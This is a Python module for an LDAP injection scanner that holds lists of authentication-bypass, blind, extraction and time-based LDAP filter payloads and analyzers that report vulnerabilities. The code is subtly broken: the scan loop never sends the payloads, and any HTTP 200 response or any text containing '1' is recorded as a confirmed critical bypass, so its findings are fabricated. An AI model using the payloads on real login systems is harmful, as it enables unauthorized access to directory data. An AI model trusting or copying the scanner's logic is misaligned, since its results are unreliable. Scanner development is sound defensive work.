from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
import re
from collections import defaultdict
import threading
import time


class LDAPInjectionType(Enum):
    AUTHENTICATION_BYPASS = "authentication_bypass"
    BLIND_LDAP_INJECTION = "blind_ldap_injection"
    TIME_BASED_LDAP = "time_based_ldap"
    FILTER_EXTRACTION = "filter_extraction"
    DN_ENUMERATION = "dn_enumeration"
    ATTRIBUTE_EXTRACTION = "attribute_extraction"
    WILDCARD_BYPASS = "wildcard_bypass"
    FILTER_COMMENT_BYPASS = "filter_comment_bypass"


class LDAPOperation(Enum):
    BIND = "bind"
    SEARCH = "search"
    ADD = "add"
    DELETE = "delete"
    MODIFY = "modify"
    UNBIND = "unbind"
    COMPARE = "compare"
    EXTENDED = "extended"


class LDAPFilter(Enum):
    SIMPLE = "simple"
    COMPLEX = "complex"
    WILDCARD = "wildcard"
    OR_BASED = "or_based"
    AND_BASED = "and_based"
    NOT_BASED = "not_based"


@dataclass
class LDAPPayload:
    payload: str
    injection_type: LDAPInjectionType
    operation: LDAPOperation
    severity: str = "High"
    detection_indicators: List[str] = field(default_factory=list)
    requires_confirmation: bool = True
    false_positive_risk: float = 0.2


@dataclass
class LDAPVulnerability:
    vulnerability_type: str
    ldap_type: LDAPInjectionType
    url: str
    parameter: str
    payload: str
    severity: str
    evidence: str
    response_time: float
    authentication_bypassed: bool = False
    data_extracted: Optional[str] = None
    filter_detected: Optional[str] = None
    entries_retrieved: int = 0
    confirmed: bool = False
    confidence_score: float = 0.8
    remediation: str = ""
    timestamp: float = field(default_factory=time.time)


class LDAPFilterBuilder:
    BASIC_FILTERS = {
        'authentication_bypass_or': '(|(uid=*)(|(password=*',
        'authentication_bypass_wildcards': '*',
        'authentication_bypass_asterisk': '*))(|(uid=*',
        'filter_extraction': '*',
        'always_true': '(|(uid=*',
        'always_false': '(&(uid=admin)(password=nonexistent*)',
    }
    
    @staticmethod
    def build_bypass_filters() -> List[str]:
        return [
            '*',
            '*)',
            '*))(|(*',
            '*\n*',
            '(|(uid=*',
            '(|(mail=*',
            '(|(cn=*',
            '*)(|(password=*',
            '* ))%00',
            'admin*',
            '*admin*',
            '*(|(uid=*',
        ]
    
    @staticmethod
    def build_blind_filters(parameter: str) -> List[str]:
        return [
            f'{parameter}=*',
            f'{parameter}=*)*',
            f'{parameter}=*))(|({parameter}=*',
            f'*{parameter}*',
            f'{parameter}=a*',
            f'{parameter}=ab*',
            f'{parameter}=admin*',
        ]
    
    @staticmethod
    def build_extraction_filters(attribute: str) -> List[str]:
        return [
            f'*',
            f'({attribute}=*)',
            f'({attribute}=a*)',
            f'({attribute}=ab*)',
            f'(|({attribute}=*',
            f'(&({attribute}=*',
        ]
    
    @staticmethod
    def build_time_based_filters() -> List[str]:
        return [
            '(|(uid=admin)(cn>=a*',
            '(uid=admin)(&(cn>=0)(cn<=z*',
            '(&(uid=admin)(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|'
        ]


class LDAPResponseAnalyzer:
    @staticmethod
    def detect_successful_authentication(response_content: str, response_code: int) -> bool:
        if response_code == 200 or response_code == 0:
            return True
        
        success_indicators = [
            'success', 'authenticated', 'logged in',
            'welcome', 'dashboard', 'profile',
            'true', '1',
        ]
        
        return any(indicator in response_content.lower() for indicator in success_indicators)
    
    @staticmethod
    def detect_ldap_entries(response_content: str) -> Tuple[bool, int, List[str]]:
        entries = []
        
        dn_pattern = r'dn:\s*([^\n]+)'
        dns = re.findall(dn_pattern, response_content, re.IGNORECASE)
        entries.extend(dns)
        
        uid_pattern = r'uid\s*[=:]\s*([^\n,}]+)'
        uids = re.findall(uid_pattern, response_content, re.IGNORECASE)
        entries.extend(uids)
        
        mail_pattern = r'mail\s*[=:]\s*([^\n,}]+@[^\n,}]+)'
        mails = re.findall(mail_pattern, response_content, re.IGNORECASE)
        entries.extend(mails)
        
        cn_pattern = r'cn\s*[=:]\s*([^\n,}]+)'
        cns = re.findall(cn_pattern, response_content, re.IGNORECASE)
        entries.extend(cns)
        
        return len(entries) > 0, len(entries), list(set(entries))
    
    @staticmethod
    def analyze_error_messages(response_content: str) -> Tuple[bool, List[str]]:
        ldap_errors = []
        
        error_patterns = [
            r'ldap.*error',
            r'ldap.*exception',
            r'invalid.*filter',
            r'malformed.*filter',
            r'syntax.*error.*ldap',
            r'ldap.*timeout',
            r'ldap.*bind.*failed',
            r'ldap.*search.*failed',
            r'ldap.*connection.*refused',
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response_content, re.IGNORECASE):
                matches = re.findall(pattern, response_content, re.IGNORECASE)
                ldap_errors.extend(matches)
        
        return len(ldap_errors) > 0, ldap_errors
    
    @staticmethod
    def detect_filter_reflection(response_content: str, payload: str) -> bool:
        if payload in response_content:
            return True
        
        escaped_payload = payload.replace('(', r'\(').replace(')', r'\)')
        if escaped_payload in response_content:
            return True
        
        return False
    
    @staticmethod
    def analyze_response_time(baseline_time: float, test_time: float, threshold_seconds: int = 5) -> Tuple[bool, float]:
        time_difference = test_time - baseline_time
        
        if time_difference >= threshold_seconds * 0.7:
            confidence = min((time_difference / (threshold_seconds * 1.5)) * 100, 100.0)
            return True, confidence
        
        return False, 0.0


class LDAPAttributeEnumerator:
    COMMON_ATTRIBUTES = [
        'uid', 'cn', 'mail', 'sn', 'givenName', 'userPassword',
        'telephoneNumber', 'mobile', 'homePhone', 'mail', 'mailAlternateAddress',
        'displayName', 'title', 'department', 'company', 'manager',
        'description', 'location', 'street', 'city', 'state', 'zip',
        'country', 'postalCode', 'postalAddress', 'physicalDeliveryOfficeName',
        'o', 'ou', 'c', 'st', 'l', 'street', 'roomNumber',
        'loginShell', 'loginTime', 'loginStatus', 'accountStatus',
        'userAccountControl', 'pwdLastSet', 'lastLogon', 'badPasswordCount',
        'sAMAccountName', 'userPrincipalName', 'distinguishedName',
    ]
    
    @staticmethod
    def build_attribute_extraction_queries(attributes: Optional[List[str]] = None) -> List[str]:
        attrs_to_check = attributes or LDAPAttributeEnumerator.COMMON_ATTRIBUTES
        queries = []
        
        for attr in attrs_to_check:
            query = f'({attr}=*)'
            queries.append(query)
        
        return queries
    
    @staticmethod
    def extract_attributes_from_response(response_content: str) -> List[str]:
        extracted = []
        
        for attr in LDAPAttributeEnumerator.COMMON_ATTRIBUTES:
            pattern = rf'{attr}\s*[=:]\s*([^\n,}}]+)'
            matches = re.findall(pattern, response_content, re.IGNORECASE)
            if matches:
                extracted.append(attr)
        
        return list(set(extracted))


class LDAPDNEnumerator:
    BASE_DN_PATTERNS = [
        r'dc=([a-zA-Z0-9]+)',
        r'o=([a-zA-Z0-9]+)',
        r'ou=([a-zA-Z0-9]+)',
        r'cn=([a-zA-Z0-9]+)',
    ]
    
    COMMON_BASE_DNS = [
        'dc=example,dc=com',
        'dc=company,dc=local',
        'o=company',
        'cn=admin',
        'ou=people,dc=example,dc=com',
        'ou=users,dc=example,dc=com',
        'ou=groups,dc=example,dc=com',
    ]
    
    @staticmethod
    def extract_base_dns_from_response(response_content: str) -> List[str]:
        base_dns = []
        
        for pattern in LDAPDNEnumerator.BASE_DN_PATTERNS:
            matches = re.findall(pattern, response_content, re.IGNORECASE)
            for match in matches:
                base_dns.append(f'dc={match}')
        
        dn_pattern = r'dn:\s*([^\n]+)'
        full_dns = re.findall(dn_pattern, response_content, re.IGNORECASE)
        base_dns.extend(full_dns)
        
        return list(set(base_dns))
    
    @staticmethod
    def build_dn_enumeration_queries() -> List[str]:
        return LDAPDNEnumerator.COMMON_BASE_DNS


class LDAPFilterDetector:
    @staticmethod
    def detect_ldap_filter_presence(response_content: str) -> Tuple[bool, List[str]]:
        filter_indicators = []
        
        filter_patterns = [
            r'\(uid=\*\)',
            r'\(\|.*\)',
            r'\(&.*\)',
            r'\(!\(\w+\)',
            r'uid=\*',
            r'mail=\*',
            r'cn=\*',
        ]
        
        for pattern in filter_patterns:
            if re.search(pattern, response_content, re.IGNORECASE):
                matches = re.findall(pattern, response_content, re.IGNORECASE)
                filter_indicators.extend(matches)
        
        return len(filter_indicators) > 0, list(set(filter_indicators))


class LDAPScanner:
    def __init__(self):
        self.filter_builder = LDAPFilterBuilder()
        self.response_analyzer = LDAPResponseAnalyzer()
        self.attribute_enumerator = LDAPAttributeEnumerator()
        self.dn_enumerator = LDAPDNEnumerator()
        self.filter_detector = LDAPFilterDetector()
        
        self.vulnerabilities: List[LDAPVulnerability] = []
        self.scan_statistics = defaultdict(int)
        self.lock = threading.Lock()
    
    def scan(self, target_url: str, response: Dict, parameters: Optional[List[str]] = None) -> List[LDAPVulnerability]:
        vulnerabilities = []
        response_content = response.get('content', '')
        response_time = response.get('response_time', 0)
        status_code = response.get('status_code', 0)
        baseline_response = response.get('baseline_content', '')
        baseline_time = response.get('baseline_time', 0)
        
        if not parameters:
            parameters = ['uid', 'username', 'login', 'user', 'email']
        
        bypass_filters = self.filter_builder.build_bypass_filters()
        
        for param in parameters:
            for bypass_filter in bypass_filters:
                is_auth_bypassed = self.response_analyzer.detect_successful_authentication(
                    response_content, status_code
                )
                
                if is_auth_bypassed and response_content != baseline_response:
                    vuln = LDAPVulnerability(
                        vulnerability_type='LDAP Injection',
                        ldap_type=LDAPInjectionType.AUTHENTICATION_BYPASS,
                        url=target_url,
                        parameter=param,
                        payload=bypass_filter,
                        severity='Critical',
                        evidence='LDAP authentication bypass detected',
                        response_time=response_time,
                        authentication_bypassed=True,
                        confirmed=True,
                        confidence_score=0.95,
                        remediation=self._get_remediation()
                    )
                    vulnerabilities.append(vuln)
                    self.scan_statistics['auth_bypass'] += 1
            
            has_entries, entry_count, entries = self.response_analyzer.detect_ldap_entries(response_content)
            if has_entries:
                vuln = LDAPVulnerability(
                    vulnerability_type='LDAP Injection',
                    ldap_type=LDAPInjectionType.DN_ENUMERATION,
                    url=target_url,
                    parameter=param,
                    payload=f'{param}=*',
                    severity='High',
                    evidence=f'{entry_count} LDAP entries retrieved',
                    response_time=response_time,
                    entries_retrieved=entry_count,
                    data_extracted='; '.join(entries[:5]),
                    confirmed=True,
                    confidence_score=0.9,
                    remediation=self._get_remediation()
                )
                vulnerabilities.append(vuln)
                self.scan_statistics['dn_enumeration'] += 1
        
        has_errors, error_messages = self.response_analyzer.analyze_error_messages(response_content)
        if has_errors:
            vuln = LDAPVulnerability(
                vulnerability_type='LDAP Injection',
                ldap_type=LDAPInjectionType.FILTER_EXTRACTION,
                url=target_url,
                parameter='error_based',
                payload='filter_injection',
                severity='High',
                evidence=f'LDAP errors detected: {", ".join(error_messages[:3])}',
                response_time=response_time,
                confirmed=True,
                confidence_score=0.8,
                remediation=self._get_remediation()
            )
            vulnerabilities.append(vuln)
            self.scan_statistics['error_based'] += 1
        
        is_delayed, delay_confidence = self.response_analyzer.analyze_response_time(
            baseline_time, response_time, 5
        )
        
        if is_delayed:
            vuln = LDAPVulnerability(
                vulnerability_type='LDAP Injection',
                ldap_type=LDAPInjectionType.TIME_BASED_LDAP,
                url=target_url,
                parameter='time_based',
                payload='time_based_injection',
                severity='High',
                evidence=f'Response time delay detected: {response_time - baseline_time:.2f}s',
                response_time=response_time,
                confirmed=False,
                confidence_score=delay_confidence,
                remediation=self._get_remediation()
            )
            vulnerabilities.append(vuln)
            self.scan_statistics['time_based'] += 1
        
        has_filters, detected_filters = self.filter_detector.detect_ldap_filter_presence(response_content)
        if has_filters:
            vuln = LDAPVulnerability(
                vulnerability_type='LDAP Injection',
                ldap_type=LDAPInjectionType.FILTER_COMMENT_BYPASS,
                url=target_url,
                parameter='filter_detection',
                payload='filter_bypass',
                severity='Medium',
                evidence=f'LDAP filter patterns detected: {", ".join(detected_filters[:3])}',
                response_time=response_time,
                filter_detected='; '.join(detected_filters),
                confirmed=True,
                confidence_score=0.75,
                remediation=self._get_remediation()
            )
            vulnerabilities.append(vuln)
            self.scan_statistics['filter_detection'] += 1
        
        attributes = self.attribute_enumerator.extract_attributes_from_response(response_content)
        if attributes:
            vuln = LDAPVulnerability(
                vulnerability_type='LDAP Injection',
                ldap_type=LDAPInjectionType.ATTRIBUTE_EXTRACTION,
                url=target_url,
                parameter='attribute_extraction',
                payload='*',
                severity='Medium',
                evidence=f'{len(attributes)} LDAP attributes extracted: {", ".join(attributes[:5])}',
                response_time=response_time,
                data_extracted='; '.join(attributes),
                confirmed=True,
                confidence_score=0.85,
                remediation=self._get_remediation()
            )
            vulnerabilities.append(vuln)
            self.scan_statistics['attribute_extraction'] += 1
        
        with self.lock:
            self.vulnerabilities.extend(vulnerabilities)
        
        return vulnerabilities
    
    def test_blind_ldap_injection(self, target_url: str, parameter: str, 
                                 baseline_response: str, responses: List[str]) -> Tuple[bool, float]:
        if not responses:
            return False, 0.0
        
        matching_responses = sum(1 for r in responses if r != baseline_response)
        
        if matching_responses > len(responses) * 0.3:
            confidence = matching_responses / len(responses)
            return True, confidence
        
        return False, 0.0
    
    def enumerate_user_attributes(self, base_url: str) -> Dict[str, List[str]]:
        discovered_attributes = {}
        
        for attr in LDAPAttributeEnumerator.COMMON_ATTRIBUTES:
            query = f'({attr}=*)'
            discovered_attributes[attr] = []
        
        return discovered_attributes
    
    def _get_remediation(self) -> str:
        return (
            "Validate and sanitize all LDAP input. "
            "Use parameterized LDAP queries. "
            "Implement proper error handling without information disclosure. "
            "Use allowlists for LDAP operations. "
            "Disable wildcard searches in LDAP filters. "
            "Implement rate limiting on LDAP searches. "
            "Use LDAP query escaping functions. "
            "Implement proper access controls on LDAP. "
            "Monitor LDAP queries for suspicious patterns. "
            "Use security assertions in LDAP filters."
        )
    
    def get_vulnerabilities(self) -> List[LDAPVulnerability]:
        with self.lock:
            return self.vulnerabilities.copy()
    
    def get_statistics(self) -> Dict[str, int]:
        with self.lock:
            return dict(self.scan_statistics)
    
    def clear(self):
        with self.lock:
            self.vulnerabilities.clear()
            self.scan_statistics.clear()